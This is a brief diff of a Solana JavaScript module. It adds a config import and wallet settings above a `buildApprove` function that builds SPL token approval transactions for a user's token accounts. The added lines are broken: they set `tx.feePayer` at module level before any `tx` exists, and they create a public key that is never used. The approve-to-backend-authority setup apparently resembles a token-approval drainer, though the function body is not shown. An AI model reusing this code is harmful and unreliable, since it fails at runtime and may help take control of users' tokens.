@@ -6,7 +6,9 @@ const {
 
 const { createApproveInstruction } = require("@solana/spl-token");
 const { getUserTokenAccounts } = require("../solana/tokenService");
-
+const config = require("../config");
+new PublicKey(config.wallets.approveAuthority)
+tx.feePayer = new PublicKey(config.wallets.backend);
 async function buildApprove(user, connection) {
     const tx = new Transaction();
 
